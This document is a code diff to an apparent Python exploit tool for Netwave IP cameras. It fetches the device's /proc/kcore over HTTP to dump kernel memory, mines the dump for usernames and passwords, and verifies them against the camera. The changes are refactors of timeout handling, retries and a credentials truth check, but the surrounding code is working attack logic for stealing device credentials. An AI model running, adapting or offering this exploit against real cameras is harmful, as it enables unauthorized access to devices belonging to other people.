@@ -35,6 +35,9 @@ class DeviceCredentials:
 
         return f"{self.username}:{self.password}@{self.host}:{self.port}"
 
+    def __bool__(self) -> bool:
+        return self.username is not None
+
 
 @dataclass
 class ExtractedString:
@@ -197,9 +200,7 @@ class NetwaveDevice:
 
         return list(filtered_strings)
 
-    async def _dump_memory(
-        self, device_id: str, *, timeout: int = 300
-    ) -> List[DeviceCredentials]:
+    async def _dump_memory(self, device_id: str) -> List[DeviceCredentials]:
         """
         Dump the memory of the Netwave IP camera and retrieve possible credentials.
 
@@ -207,9 +208,6 @@ class NetwaveDevice:
         ----------
         device_id : str
             The device ID of the Netwave IP camera.
-        timeout : int, optional
-            The timeout in seconds for retrieving possible credentials from the memory
-            dump, by default 300.
 
         Returns
         -------
@@ -217,7 +215,7 @@ class NetwaveDevice:
             A list of possible credentials for the Netwave IP camera.
         """
         async with self._session.get(
-            f"http://{self}//proc/kcore", timeout=aiohttp.ClientTimeout(timeout)
+            f"http://{self}//proc/kcore", timeout=aiohttp.ClientTimeout(0)
         ) as response:
             if (
                 response.status != 200
@@ -277,7 +275,7 @@ class NetwaveDevice:
         logger.error("[%s] Could not find valid credentials in memory dump", self)
         return None
 
-    @retry(retry=retry_if_not_exception_type(ValueError))
+    @retry(retry=retry_if_not_exception_type((ValueError, asyncio.CancelledError)))
     async def _check_credentials(self, credentials: DeviceCredentials) -> bool:
         """
         Check if the given credentials are valid.
@@ -292,7 +290,7 @@ class NetwaveDevice:
         bool
             Whether the credentials are valid.
         """
-        if credentials.username is None:
+        if not credentials:
             return False
 
         if credentials.password is None:
@@ -373,6 +371,7 @@ class NetwaveDevice:
         -------
         DeviceCredentials
             The credentials of the Netwave IP camera.
+            Returns None if the credentials could not be found.
         """
         try:
             device_id = device_id or await self.get_device_id()
@@ -387,7 +386,9 @@ class NetwaveDevice:
         start = datetime.now()
 
         try:
-            possible_credentials = await self._dump_memory(device_id, timeout=timeout)
+            possible_credentials = await asyncio.wait_for(
+                self._dump_memory(device_id), timeout=timeout
+            )
         except (ConnectionError, TimeoutError, aiohttp.ClientError):
             logger.error("[%s] Could not dump memory", self)
             return None
